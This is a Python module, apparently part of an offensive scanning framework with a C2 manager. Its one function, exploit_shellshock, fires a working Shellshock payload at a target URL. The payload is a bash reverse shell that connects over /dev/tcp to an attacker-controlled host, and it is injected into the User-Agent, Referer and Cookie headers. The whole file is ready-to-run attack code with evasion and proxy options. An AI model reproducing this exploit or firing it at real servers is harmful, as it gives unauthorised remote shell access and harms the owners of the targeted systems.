import aiohttp
import asyncio

async def exploit_shellshock(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Injects Shellshock payloads into User-Agent / CGI params.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # Payload: Bash Reverse Shell "KINETIC STRIKE"
    from core.c2_manager import c2_manager
    import random
    
    lhost = c2_manager.get_lhost_address(url)
    lport = random.randint(10000, 20000)
    
    # Standard Bash Reverse Shell
    cmd = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = f"() {{ :;}}; echo; /bin/bash -c '{cmd}'"
    
    attack_headers = {
        "User-Agent": payload,
        "Referer": payload,
        "Cookie": f"session={payload}"
    }
    
    final_headers.update(attack_headers)
    
    try:
         if log_callback: 
             log_callback(f"   üêö Shellshock: Launching KINETIC STRIKE C2 to {lhost}:{lport}...")
         
         # Start Listener (Async? Need infrastructure for that, or assume User has it)
         # Note: cve_sniper controls listeners via execute_c2_exploit.
         # Here we just fire the payload. c2_manager usually needs to register a listener task.
         # For simplicity in this standalone module, we just fire. 
         # The User is expected to have a listener or we rely on OAST.
         
         async with aiohttp.ClientSession() as session:
             # Fire and forget (it hangs if successful)
             try:
                 async with session.get(url, headers=final_headers, timeout=2, ssl=False, proxy=proxy) as resp:
                     pass
             except asyncio.TimeoutError:
                 if log_callback: log_callback("   ‚úÖ Shellshock Triggered (Connection likely established)")
                 findings.append({
                    "type": "Shellshock RCE (Active)",
                    "severity": "Critical",
                    "detail": "Reverse Shell Payload delivered.",
                    "evidence": f"Payload: {payload}",
                    "remediation": "Patch Bash."
                 })
    except Exception: pass

    return findings
